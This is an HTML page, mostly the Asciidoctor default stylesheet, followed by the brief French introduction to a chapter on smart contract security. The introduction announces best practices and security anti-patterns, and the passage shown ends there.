<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="Asciidoctor 2.0.17">
<title>Sécurité des contrats intelligents</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700">
<style>
/*! Asciidoctor default stylesheet | MIT License | https://asciidoctor.org */
/* Uncomment the following line when using as a custom stylesheet */
/* @import "https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700"; */
html{font-family:sans-serif;-webkit-text-size-adjust:100%}
a{background:none}
a:focus{outline:thin dotted}
a:active,a:hover{outline:0}
h1{font-size:2em;margin:.67em 0}
b,strong{font-weight:bold}
abbr{font-size:.9em}
abbr[title]{cursor:help;border-bottom:1px dotted #dddddf;text-decoration:none}
dfn{font-style:italic}
hr{height:0}
mark{background:#ff0;color:#000}
code,kbd,pre,samp{font-family:monospace;font-size:1em}
pre{white-space:pre-wrap}
q{quotes:"\201C" "\201D" "\2018" "\2019"}
small{font-size:80%}
sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
sup{top:-.5em}
sub{bottom:-.25em}
img{border:0}
svg:not(:root){overflow:hidden}
figure{margin:0}
audio,video{display:inline-block}
audio:not([controls]){display:none;height:0}
fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}
legend{border:0;padding:0}
button,input,select,textarea{font-family:inherit;font-size:100%;margin:0}
button,input{line-height:normal}
button,select{text-transform:none}
button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}
button[disabled],html input[disabled]{cursor:default}
input[type=checkbox],input[type=radio]{padding:0}
button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}
textarea{overflow:auto;vertical-align:top}
table{border-collapse:collapse;border-spacing:0}
*,::before,::after{box-sizing:border-box}
html,body{font-size:100%}
body{background:#fff;color:rgba(0,0,0,.8);padding:0;margin:0;font-family:"Noto Serif","DejaVu Serif",serif;line-height:1;position:relative;cursor:auto;-moz-tab-size:4;-o-tab-size:4;tab-size:4;word-wrap:anywhere;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}
a:hover{cursor:pointer}
img,object,embed{max-width:100%;height:auto}
object,embed{height:100%}
img{-ms-interpolation-mode:bicubic}
.left{float:left!important}
.right{float:right!important}
.text-left{text-align:left!important}
.text-right{text-align:right!important}
.text-center{text-align:center!important}
.text-justify{text-align:justify!important}
.hide{display:none}
img,object,svg{display:inline-block;vertical-align:middle}
textarea{height:auto;min-height:50px}
select{width:100%}
.subheader,.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{line-height:1.45;color:#7a2518;font-weight:400;margin-top:0;margin-bottom:.25em}
div,dl,dt,dd,ul,ol,li,h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6,pre,form,p,blockquote,th,td{margin:0;padding:0}
a{color:#2156a5;text-decoration:underline;line-height:inherit}
a:hover,a:focus{color:#1d4b8f}
a img{border:0}
p{line-height:1.6;margin-bottom:1.25em;text-rendering:optimizeLegibility}
p aside{font-size:.875em;line-height:1.35;font-style:italic}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{font-family:"Open Sans","DejaVu Sans",sans-serif;font-weight:300;font-style:normal;color:#ba3925;text-rendering:optimizeLegibility;margin-top:1em;margin-bottom:.5em;line-height:1.0125em}
h1 small,h2 small,h3 small,#toctitle small,.sidebarblock>.content>.title small,h4 small,h5 small,h6 small{font-size:60%;color:#e99b8f;line-height:0}
h1{font-size:2.125em}
h2{font-size:1.6875em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.375em}
h4,h5{font-size:1.125em}
h6{font-size:1em}
hr{border:solid #dddddf;border-width:1px 0 0;clear:both;margin:1.25em 0 1.1875em}
em,i{font-style:italic;line-height:inherit}
strong,b{font-weight:bold;line-height:inherit}
small{font-size:60%;line-height:inherit}
code{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;font-weight:400;color:rgba(0,0,0,.9)}
ul,ol,dl{line-height:1.6;margin-bottom:1.25em;list-style-position:outside;font-family:inherit}
ul,ol{margin-left:1.5em}
ul li ul,ul li ol{margin-left:1.25em;margin-bottom:0}
ul.square li ul,ul.circle li ul,ul.disc li ul{list-style:inherit}
ul.square{list-style-type:square}
ul.circle{list-style-type:circle}
ul.disc{list-style-type:disc}
ol li ul,ol li ol{margin-left:1.25em;margin-bottom:0}
dl dt{margin-bottom:.3125em;font-weight:bold}
dl dd{margin-bottom:1.25em}
blockquote{margin:0 0 1.25em;padding:.5625em 1.25em 0 1.1875em;border-left:1px solid #ddd}
blockquote,blockquote p{line-height:1.6;color:rgba(0,0,0,.85)}
@media screen and (min-width:768px){h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2}
h1{font-size:2.75em}
h2{font-size:2.3125em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.6875em}
h4{font-size:1.4375em}}
table{background:#fff;margin-bottom:1.25em;border:1px solid #dedede;word-wrap:normal}
table thead,table tfoot{background:#f7f8f7}
table thead tr th,table thead tr td,table tfoot tr th,table tfoot tr td{padding:.5em .625em .625em;font-size:inherit;color:rgba(0,0,0,.8);text-align:left}
table tr th,table tr td{padding:.5625em .625em;font-size:inherit;color:rgba(0,0,0,.8)}
table tr.even,table tr.alt{background:#f8f8f7}
table thead tr th,table tfoot tr th,table tbody tr td,table tr td,table tfoot tr td{line-height:1.6}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2;word-spacing:-.05em}
h1 strong,h2 strong,h3 strong,#toctitle strong,.sidebarblock>.content>.title strong,h4 strong,h5 strong,h6 strong{font-weight:400}
.center{margin-left:auto;margin-right:auto}
.stretch{width:100%}
.clearfix::before,.clearfix::after,.float-group::before,.float-group::after{content:" ";display:table}
.clearfix::after,.float-group::after{clear:both}
:not(pre).nobreak{word-wrap:normal}
:not(pre).nowrap{white-space:nowrap}
:not(pre).pre-wrap{white-space:pre-wrap}
:not(pre):not([class^=L])>code{font-size:.9375em;font-style:normal!important;letter-spacing:0;padding:.1em .5ex;word-spacing:-.15em;background:#f7f7f8;border-radius:4px;line-height:1.45;text-rendering:optimizeSpeed}
pre{color:rgba(0,0,0,.9);font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;line-height:1.45;text-rendering:optimizeSpeed}
pre code,pre pre{color:inherit;font-size:inherit;line-height:inherit}
pre>code{display:block}
pre.nowrap,pre.nowrap pre{white-space:pre;word-wrap:normal}
em em{font-style:normal}
strong strong{font-weight:400}
.keyseq{color:rgba(51,51,51,.8)}
kbd{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;display:inline-block;color:rgba(0,0,0,.8);font-size:.65em;line-height:1.45;background:#f7f7f7;border:1px solid #ccc;border-radius:3px;box-shadow:0 1px 0 rgba(0,0,0,.2),inset 0 0 0 .1em #fff;margin:0 .15em;padding:.2em .5em;vertical-align:middle;position:relative;top:-.1em;white-space:nowrap}
.keyseq kbd:first-child{margin-left:0}
.keyseq kbd:last-child{margin-right:0}
.menuseq,.menuref{color:#000}
.menuseq b:not(.caret),.menuref{font-weight:inherit}
.menuseq{word-spacing:-.02em}
.menuseq b.caret{font-size:1.25em;line-height:.8}
.menuseq i.caret{font-weight:bold;text-align:center;width:.45em}
b.button::before,b.button::after{position:relative;top:-1px;font-weight:400}
b.button::before{content:"[";padding:0 3px 0 2px}
b.button::after{content:"]";padding:0 2px 0 3px}
p a>code:hover{color:rgba(0,0,0,.9)}
#header,#content,#footnotes,#footer{width:100%;margin:0 auto;max-width:62.5em;*zoom:1;position:relative;padding-left:.9375em;padding-right:.9375em}
#header::before,#header::after,#content::before,#content::after,#footnotes::before,#footnotes::after,#footer::before,#footer::after{content:" ";display:table}
#header::after,#content::after,#footnotes::after,#footer::after{clear:both}
#content{margin-top:1.25em}
#content::before{content:none}
#header>h1:first-child{color:rgba(0,0,0,.85);margin-top:2.25rem;margin-bottom:0}
#header>h1:first-child+#toc{margin-top:8px;border-top:1px solid #dddddf}
#header>h1:only-child,body.toc2 #header>h1:nth-last-child(2){border-bottom:1px solid #dddddf;padding-bottom:8px}
#header .details{border-bottom:1px solid #dddddf;line-height:1.45;padding-top:.25em;padding-bottom:.25em;padding-left:.25em;color:rgba(0,0,0,.6);display:flex;flex-flow:row wrap}
#header .details span:first-child{margin-left:-.125em}
#header .details span.email a{color:rgba(0,0,0,.85)}
#header .details br{display:none}
#header .details br+span::before{content:"\00a0\2013\00a0"}
#header .details br+span.author::before{content:"\00a0\22c5\00a0";color:rgba(0,0,0,.85)}
#header .details br+span#revremark::before{content:"\00a0|\00a0"}
#header #revnumber{text-transform:capitalize}
#header #revnumber::after{content:"\00a0"}
#content>h1:first-child:not([class]){color:rgba(0,0,0,.85);border-bottom:1px solid #dddddf;padding-bottom:8px;margin-top:0;padding-top:1rem;margin-bottom:1.25rem}
#toc{border-bottom:1px solid #e7e7e9;padding-bottom:.5em}
#toc>ul{margin-left:.125em}
#toc ul.sectlevel0>li>a{font-style:italic}
#toc ul.sectlevel0 ul.sectlevel1{margin:.5em 0}
#toc ul{font-family:"Open Sans","DejaVu Sans",sans-serif;list-style-type:none}
#toc li{line-height:1.3334;margin-top:.3334em}
#toc a{text-decoration:none}
#toc a:active{text-decoration:underline}
#toctitle{color:#7a2518;font-size:1.2em}
@media screen and (min-width:768px){#toctitle{font-size:1.375em}
body.toc2{padding-left:15em;padding-right:0}
#toc.toc2{margin-top:0!important;background:#f8f8f7;position:fixed;width:15em;left:0;top:0;border-right:1px solid #e7e7e9;border-top-width:0!important;border-bottom-width:0!important;z-index:1000;padding:1.25em 1em;height:100%;overflow:auto}
#toc.toc2 #toctitle{margin-top:0;margin-bottom:.8rem;font-size:1.2em}
#toc.toc2>ul{font-size:.9em;margin-bottom:0}
#toc.toc2 ul ul{margin-left:0;padding-left:1em}
#toc.toc2 ul.sectlevel0 ul.sectlevel1{padding-left:0;margin-top:.5em;margin-bottom:.5em}
body.toc2.toc-right{padding-left:0;padding-right:15em}
body.toc2.toc-right #toc.toc2{border-right-width:0;border-left:1px solid #e7e7e9;left:auto;right:0}}
@media screen and (min-width:1280px){body.toc2{padding-left:20em;padding-right:0}
#toc.toc2{width:20em}
#toc.toc2 #toctitle{font-size:1.375em}
#toc.toc2>ul{font-size:.95em}
#toc.toc2 ul ul{padding-left:1.25em}
body.toc2.toc-right{padding-left:0;padding-right:20em}}
#content #toc{border:1px solid #e0e0dc;margin-bottom:1.25em;padding:1.25em;background:#f8f8f7;border-radius:4px}
#content #toc>:first-child{margin-top:0}
#content #toc>:last-child{margin-bottom:0}
#footer{max-width:none;background:rgba(0,0,0,.8);padding:1.25em}
#footer-text{color:hsla(0,0%,100%,.8);line-height:1.44}
#content{margin-bottom:.625em}
.sect1{padding-bottom:.625em}
@media screen and (min-width:768px){#content{margin-bottom:1.25em}
.sect1{padding-bottom:1.25em}}
.sect1:last-child{padding-bottom:0}
.sect1+.sect1{border-top:1px solid #e7e7e9}
#content h1>a.anchor,h2>a.anchor,h3>a.anchor,#toctitle>a.anchor,.sidebarblock>.content>.title>a.anchor,h4>a.anchor,h5>a.anchor,h6>a.anchor{position:absolute;z-index:1001;width:1.5ex;margin-left:-1.5ex;display:block;text-decoration:none!important;visibility:hidden;text-align:center;font-weight:400}
#content h1>a.anchor::before,h2>a.anchor::before,h3>a.anchor::before,#toctitle>a.anchor::before,.sidebarblock>.content>.title>a.anchor::before,h4>a.anchor::before,h5>a.anchor::before,h6>a.anchor::before{content:"\00A7";font-size:.85em;display:block;padding-top:.1em}
#content h1:hover>a.anchor,#content h1>a.anchor:hover,h2:hover>a.anchor,h2>a.anchor:hover,h3:hover>a.anchor,#toctitle:hover>a.anchor,.sidebarblock>.content>.title:hover>a.anchor,h3>a.anchor:hover,#toctitle>a.anchor:hover,.sidebarblock>.content>.title>a.anchor:hover,h4:hover>a.anchor,h4>a.anchor:hover,h5:hover>a.anchor,h5>a.anchor:hover,h6:hover>a.anchor,h6>a.anchor:hover{visibility:visible}
#content h1>a.link,h2>a.link,h3>a.link,#toctitle>a.link,.sidebarblock>.content>.title>a.link,h4>a.link,h5>a.link,h6>a.link{color:#ba3925;text-decoration:none}
#content h1>a.link:hover,h2>a.link:hover,h3>a.link:hover,#toctitle>a.link:hover,.sidebarblock>.content>.title>a.link:hover,h4>a.link:hover,h5>a.link:hover,h6>a.link:hover{color:#a53221}
details,.audioblock,.imageblock,.literalblock,.listingblock,.stemblock,.videoblock{margin-bottom:1.25em}
details{margin-left:1.25rem}
details>summary{cursor:pointer;display:block;position:relative;line-height:1.6;margin-bottom:.625rem;outline:none;-webkit-tap-highlight-color:transparent}
details>summary::-webkit-details-marker{display:none}
details>summary::before{content:"";border:solid transparent;border-left:solid;border-width:.3em 0 .3em .5em;position:absolute;top:.5em;left:-1.25rem;transform:translateX(15%)}
details[open]>summary::before{border:solid transparent;border-top:solid;border-width:.5em .3em 0;transform:translateY(15%)}
details>summary::after{content:"";width:1.25rem;height:1em;position:absolute;top:.3em;left:-1.25rem}
.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{text-rendering:optimizeLegibility;text-align:left;font-family:"Noto Serif","DejaVu Serif",serif;font-size:1rem;font-style:italic}
table.tableblock.fit-content>caption.title{white-space:nowrap;width:0}
.paragraph.lead>p,#preamble>.sectionbody>[class=paragraph]:first-of-type p{font-size:1.21875em;line-height:1.6;color:rgba(0,0,0,.85)}
.admonitionblock>table{border-collapse:separate;border:0;background:none;width:100%}
.admonitionblock>table td.icon{text-align:center;width:80px}
.admonitionblock>table td.icon img{max-width:none}
.admonitionblock>table td.icon .title{font-weight:bold;font-family:"Open Sans","DejaVu Sans",sans-serif;text-transform:uppercase}
.admonitionblock>table td.content{padding-left:1.125em;padding-right:1.25em;border-left:1px solid #dddddf;color:rgba(0,0,0,.6);word-wrap:anywhere}
.admonitionblock>table td.content>:last-child>:last-child{margin-bottom:0}
.exampleblock>.content{border:1px solid #e6e6e6;margin-bottom:1.25em;padding:1.25em;background:#fff;border-radius:4px}
.exampleblock>.content>:first-child{margin-top:0}
.exampleblock>.content>:last-child{margin-bottom:0}
.sidebarblock{border:1px solid #dbdbd6;margin-bottom:1.25em;padding:1.25em;background:#f3f3f2;border-radius:4px}
.sidebarblock>:first-child{margin-top:0}
.sidebarblock>:last-child{margin-bottom:0}
.sidebarblock>.content>.title{color:#7a2518;margin-top:0;text-align:center}
.exampleblock>.content>:last-child>:last-child,.exampleblock>.content .olist>ol>li:last-child>:last-child,.exampleblock>.content .ulist>ul>li:last-child>:last-child,.exampleblock>.content .qlist>ol>li:last-child>:last-child,.sidebarblock>.content>:last-child>:last-child,.sidebarblock>.content .olist>ol>li:last-child>:last-child,.sidebarblock>.content .ulist>ul>li:last-child>:last-child,.sidebarblock>.content .qlist>ol>li:last-child>:last-child{margin-bottom:0}
.literalblock pre,.listingblock>.content>pre{border-radius:4px;overflow-x:auto;padding:1em;font-size:.8125em}
@media screen and (min-width:768px){.literalblock pre,.listingblock>.content>pre{font-size:.90625em}}
@media screen and (min-width:1280px){.literalblock pre,.listingblock>.content>pre{font-size:1em}}
.literalblock pre,.listingblock>.content>pre:not(.highlight),.listingblock>.content>pre[class=highlight],.listingblock>.content>pre[class^="highlight "]{background:#f7f7f8}
.literalblock.output pre{color:#f7f7f8;background:rgba(0,0,0,.9)}
.listingblock>.content{position:relative}
.listingblock code[data-lang]::before{display:none;content:attr(data-lang);position:absolute;font-size:.75em;top:.425rem;right:.5rem;line-height:1;text-transform:uppercase;color:inherit;opacity:.5}
.listingblock:hover code[data-lang]::before{display:block}
.listingblock.terminal pre .command::before{content:attr(data-prompt);padding-right:.5em;color:inherit;opacity:.5}
.listingblock.terminal pre .command:not([data-prompt])::before{content:"$"}
.listingblock pre.highlightjs{padding:0}
.listingblock pre.highlightjs>code{padding:1em;border-radius:4px}
.listingblock pre.prettyprint{border-width:0}
.prettyprint{background:#f7f7f8}
pre.prettyprint .linenums{line-height:1.45;margin-left:2em}
pre.prettyprint li{background:none;list-style-type:inherit;padding-left:0}
pre.prettyprint li code[data-lang]::before{opacity:1}
pre.prettyprint li:not(:first-child) code[data-lang]::before{display:none}
table.linenotable{border-collapse:separate;border:0;margin-bottom:0;background:none}
table.linenotable td[class]{color:inherit;vertical-align:top;padding:0;line-height:inherit;white-space:normal}
table.linenotable td.code{padding-left:.75em}
table.linenotable td.linenos,pre.pygments .linenos{border-right:1px solid;opacity:.35;padding-right:.5em;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
pre.pygments span.linenos{display:inline-block;margin-right:.75em}
.quoteblock{margin:0 1em 1.25em 1.5em;display:table}
.quoteblock:not(.excerpt)>.title{margin-left:-1.5em;margin-bottom:.75em}
.quoteblock blockquote,.quoteblock p{color:rgba(0,0,0,.85);font-size:1.15rem;line-height:1.75;word-spacing:.1em;letter-spacing:0;font-style:italic;text-align:justify}
.quoteblock blockquote{margin:0;padding:0;border:0}
.quoteblock blockquote::before{content:"\201c";float:left;font-size:2.75em;font-weight:bold;line-height:.6em;margin-left:-.6em;color:#7a2518;text-shadow:0 1px 2px rgba(0,0,0,.1)}
.quoteblock blockquote>.paragraph:last-child p{margin-bottom:0}
.quoteblock .attribution{margin-top:.75em;margin-right:.5ex;text-align:right}
.verseblock{margin:0 1em 1.25em}
.verseblock pre{font-family:"Open Sans","DejaVu Sans",sans-serif;font-size:1.15rem;color:rgba(0,0,0,.85);font-weight:300;text-rendering:optimizeLegibility}
.verseblock pre strong{font-weight:400}
.verseblock .attribution{margin-top:1.25rem;margin-left:.5ex}
.quoteblock .attribution,.verseblock .attribution{font-size:.9375em;line-height:1.45;font-style:italic}
.quoteblock .attribution br,.verseblock .attribution br{display:none}
.quoteblock .attribution cite,.verseblock .attribution cite{display:block;letter-spacing:-.025em;color:rgba(0,0,0,.6)}
.quoteblock.abstract blockquote::before,.quoteblock.excerpt blockquote::before,.quoteblock .quoteblock blockquote::before{display:none}
.quoteblock.abstract blockquote,.quoteblock.abstract p,.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{line-height:1.6;word-spacing:0}
.quoteblock.abstract{margin:0 1em 1.25em;display:block}
.quoteblock.abstract>.title{margin:0 0 .375em;font-size:1.15em;text-align:center}
.quoteblock.excerpt>blockquote,.quoteblock .quoteblock{padding:0 0 .25em 1em;border-left:.25em solid #dddddf}
.quoteblock.excerpt,.quoteblock .quoteblock{margin-left:0}
.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{color:inherit;font-size:1.0625rem}
.quoteblock.excerpt .attribution,.quoteblock .quoteblock .attribution{color:inherit;font-size:.85rem;text-align:left;margin-right:0}
p.tableblock:last-child{margin-bottom:0}
td.tableblock>.content{margin-bottom:1.25em;word-wrap:anywhere}
td.tableblock>.content>:last-child{margin-bottom:-1.25em}
table.tableblock,th.tableblock,td.tableblock{border:0 solid #dedede}
table.grid-all>*>tr>*{border-width:1px}
table.grid-cols>*>tr>*{border-width:0 1px}
table.grid-rows>*>tr>*{border-width:1px 0}
table.frame-all{border-width:1px}
table.frame-ends{border-width:1px 0}
table.frame-sides{border-width:0 1px}
table.frame-none>colgroup+*>:first-child>*,table.frame-sides>colgroup+*>:first-child>*{border-top-width:0}
table.frame-none>:last-child>:last-child>*,table.frame-sides>:last-child>:last-child>*{border-bottom-width:0}
table.frame-none>*>tr>:first-child,table.frame-ends>*>tr>:first-child{border-left-width:0}
table.frame-none>*>tr>:last-child,table.frame-ends>*>tr>:last-child{border-right-width:0}
table.stripes-all>*>tr,table.stripes-odd>*>tr:nth-of-type(odd),table.stripes-even>*>tr:nth-of-type(even),table.stripes-hover>*>tr:hover{background:#f8f8f7}
th.halign-left,td.halign-left{text-align:left}
th.halign-right,td.halign-right{text-align:right}
th.halign-center,td.halign-center{text-align:center}
th.valign-top,td.valign-top{vertical-align:top}
th.valign-bottom,td.valign-bottom{vertical-align:bottom}
th.valign-middle,td.valign-middle{vertical-align:middle}
table thead th,table tfoot th{font-weight:bold}
tbody tr th{background:#f7f8f7}
tbody tr th,tbody tr th p,tfoot tr th,tfoot tr th p{color:rgba(0,0,0,.8);font-weight:bold}
p.tableblock>code:only-child{background:none;padding:0}
p.tableblock{font-size:1em}
ol{margin-left:1.75em}
ul li ol{margin-left:1.5em}
dl dd{margin-left:1.125em}
dl dd:last-child,dl dd:last-child>:last-child{margin-bottom:0}
li p,ul dd,ol dd,.olist .olist,.ulist .ulist,.ulist .olist,.olist .ulist{margin-bottom:.625em}
ul.checklist,ul.none,ol.none,ul.no-bullet,ol.no-bullet,ol.unnumbered,ul.unstyled,ol.unstyled{list-style-type:none}
ul.no-bullet,ol.no-bullet,ol.unnumbered{margin-left:.625em}
ul.unstyled,ol.unstyled{margin-left:0}
li>p:empty:only-child::before{content:"";display:inline-block}
ul.checklist>li>p:first-child{margin-left:-1em}
ul.checklist>li>p:first-child>.fa-square-o:first-child,ul.checklist>li>p:first-child>.fa-check-square-o:first-child{width:1.25em;font-size:.8em;position:relative;bottom:.125em}
ul.checklist>li>p:first-child>input[type=checkbox]:first-child{margin-right:.25em}
ul.inline{display:flex;flex-flow:row wrap;list-style:none;margin:0 0 .625em -1.25em}
ul.inline>li{margin-left:1.25em}
.unstyled dl dt{font-weight:400;font-style:normal}
ol.arabic{list-style-type:decimal}
ol.decimal{list-style-type:decimal-leading-zero}
ol.loweralpha{list-style-type:lower-alpha}
ol.upperalpha{list-style-type:upper-alpha}
ol.lowerroman{list-style-type:lower-roman}
ol.upperroman{list-style-type:upper-roman}
ol.lowergreek{list-style-type:lower-greek}
.hdlist>table,.colist>table{border:0;background:none}
.hdlist>table>tbody>tr,.colist>table>tbody>tr{background:none}
td.hdlist1,td.hdlist2{vertical-align:top;padding:0 .625em}
td.hdlist1{font-weight:bold;padding-bottom:1.25em}
td.hdlist2{word-wrap:anywhere}
.literalblock+.colist,.listingblock+.colist{margin-top:-.5em}
.colist td:not([class]):first-child{padding:.4em .75em 0;line-height:1;vertical-align:top}
.colist td:not([class]):first-child img{max-width:none}
.colist td:not([class]):last-child{padding:.25em 0}
.thumb,.th{line-height:0;display:inline-block;border:4px solid #fff;box-shadow:0 0 0 1px #ddd}
.imageblock.left{margin:.25em .625em 1.25em 0}
.imageblock.right{margin:.25em 0 1.25em .625em}
.imageblock>.title{margin-bottom:0}
.imageblock.thumb,.imageblock.th{border-width:6px}
.imageblock.thumb>.title,.imageblock.th>.title{padding:0 .125em}
.image.left,.image.right{margin-top:.25em;margin-bottom:.25em;display:inline-block;line-height:0}
.image.left{margin-right:.625em}
.image.right{margin-left:.625em}
a.image{text-decoration:none;display:inline-block}
a.image object{pointer-events:none}
sup.footnote,sup.footnoteref{font-size:.875em;position:static;vertical-align:super}
sup.footnote a,sup.footnoteref a{text-decoration:none}
sup.footnote a:active,sup.footnoteref a:active{text-decoration:underline}
#footnotes{padding-top:.75em;padding-bottom:.75em;margin-bottom:.625em}
#footnotes hr{width:20%;min-width:6.25em;margin:-.25em 0 .75em;border-width:1px 0 0}
#footnotes .footnote{padding:0 .375em 0 .225em;line-height:1.3334;font-size:.875em;margin-left:1.2em;margin-bottom:.2em}
#footnotes .footnote a:first-of-type{font-weight:bold;text-decoration:none;margin-left:-1.05em}
#footnotes .footnote:last-of-type{margin-bottom:0}
#content #footnotes{margin-top:-.625em;margin-bottom:0;padding:.75em 0}
div.unbreakable{page-break-inside:avoid}
.big{font-size:larger}
.small{font-size:smaller}
.underline{text-decoration:underline}
.overline{text-decoration:overline}
.line-through{text-decoration:line-through}
.aqua{color:#00bfbf}
.aqua-background{background:#00fafa}
.black{color:#000}
.black-background{background:#000}
.blue{color:#0000bf}
.blue-background{background:#0000fa}
.fuchsia{color:#bf00bf}
.fuchsia-background{background:#fa00fa}
.gray{color:#606060}
.gray-background{background:#7d7d7d}
.green{color:#006000}
.green-background{background:#007d00}
.lime{color:#00bf00}
.lime-background{background:#00fa00}
.maroon{color:#600000}
.maroon-background{background:#7d0000}
.navy{color:#000060}
.navy-background{background:#00007d}
.olive{color:#606000}
.olive-background{background:#7d7d00}
.purple{color:#600060}
.purple-background{background:#7d007d}
.red{color:#bf0000}
.red-background{background:#fa0000}
.silver{color:#909090}
.silver-background{background:#bcbcbc}
.teal{color:#006060}
.teal-background{background:#007d7d}
.white{color:#bfbfbf}
.white-background{background:#fafafa}
.yellow{color:#bfbf00}
.yellow-background{background:#fafa00}
span.icon>.fa{cursor:default}
a span.icon>.fa{cursor:inherit}
.admonitionblock td.icon [class^="fa icon-"]{font-size:2.5em;text-shadow:1px 1px 2px rgba(0,0,0,.5);cursor:default}
.admonitionblock td.icon .icon-note::before{content:"\f05a";color:#19407c}
.admonitionblock td.icon .icon-tip::before{content:"\f0eb";text-shadow:1px 1px 2px rgba(155,155,0,.8);color:#111}
.admonitionblock td.icon .icon-warning::before{content:"\f071";color:#bf6900}
.admonitionblock td.icon .icon-caution::before{content:"\f06d";color:#bf3400}
.admonitionblock td.icon .icon-important::before{content:"\f06a";color:#bf0000}
.conum[data-value]{display:inline-block;color:#fff!important;background:rgba(0,0,0,.8);border-radius:50%;text-align:center;font-size:.75em;width:1.67em;height:1.67em;line-height:1.67em;font-family:"Open Sans","DejaVu Sans",sans-serif;font-style:normal;font-weight:bold}
.conum[data-value] *{color:#fff!important}
.conum[data-value]+b{display:none}
.conum[data-value]::after{content:attr(data-value)}
pre .conum[data-value]{position:relative;top:-.125em}
b.conum *{color:inherit!important}
.conum:not([data-value]):empty{display:none}
dt,th.tableblock,td.content,div.footnote{text-rendering:optimizeLegibility}
h1,h2,p,td.content,span.alt,summary{letter-spacing:-.01em}
p strong,td.content strong,div.footnote strong{letter-spacing:-.005em}
p,blockquote,dt,td.content,span.alt,summary{font-size:1.0625rem}
p{margin-bottom:1.25rem}
.sidebarblock p,.sidebarblock dt,.sidebarblock td.content,p.tableblock{font-size:1em}
.exampleblock>.content{background:#fffef7;border-color:#e0e0dc;box-shadow:0 1px 4px #e0e0dc}
.print-only{display:none!important}
@page{margin:1.25cm .75cm}
@media print{*{box-shadow:none!important;text-shadow:none!important}
html{font-size:80%}
a{color:inherit!important;text-decoration:underline!important}
a.bare,a[href^="#"],a[href^="mailto:"]{text-decoration:none!important}
a[href^="http:"]:not(.bare)::after,a[href^="https:"]:not(.bare)::after{content:"(" attr(href) ")";display:inline-block;font-size:.875em;padding-left:.25em}
abbr[title]{border-bottom:1px dotted}
abbr[title]::after{content:" (" attr(title) ")"}
pre,blockquote,tr,img,object,svg{page-break-inside:avoid}
thead{display:table-header-group}
svg{max-width:100%}
p,blockquote,dt,td.content{font-size:1em;orphans:3;widows:3}
h2,h3,#toctitle,.sidebarblock>.content>.title{page-break-after:avoid}
#header,#content,#footnotes,#footer{max-width:none}
#toc,.sidebarblock,.exampleblock>.content{background:none!important}
#toc{border-bottom:1px solid #dddddf!important;padding-bottom:0!important}
body.book #header{text-align:center}
body.book #header>h1:first-child{border:0!important;margin:2.5em 0 1em}
body.book #header .details{border:0!important;display:block;padding:0!important}
body.book #header .details span:first-child{margin-left:0!important}
body.book #header .details br{display:block}
body.book #header .details br+span::before{content:none!important}
body.book #toc{border:0!important;text-align:left!important;padding:0!important;margin:0!important}
body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-break-before:always}
.listingblock code[data-lang]::before{display:block}
#footer{padding:0 .9375em}
.hide-on-print{display:none!important}
.print-only{display:block!important}
.hide-for-print{display:none!important}
.show-for-print{display:inherit!important}}
@media amzn-kf8,print{#header>h1:first-child{margin-top:1.25rem}
.sect1{padding:0!important}
.sect1+.sect1{border:0}
#footer{background:none}
#footer-text{color:rgba(0,0,0,.6);font-size:.9em}}
@media amzn-kf8{#header,#content,#footnotes,#footer{padding:0}}
</style>
</head>
<body class="article">
<div id="header">
</div>
<div id="content">
<div class="sect1">
<h2 id="smart_contract_security">Sécurité des contrats intelligents</h2>
<div class="sectionbody">
<div class="paragraph">
<p>La sécurité est l&#8217;une des considérations les plus importantes lors de la rédaction de contrats intelligents. Dans le domaine de la programmation de contrats intelligents, les erreurs sont coûteuses et facilement exploitables. Dans ce chapitre, nous examinerons les meilleures pratiques de sécurité et les modèles de conception, ainsi que les «anti-modèles de sécurité», qui sont des pratiques et des modèles qui peuvent introduire des vulnérabilités dans nos contrats intelligents.</p>
</div>
<div class="paragraph">
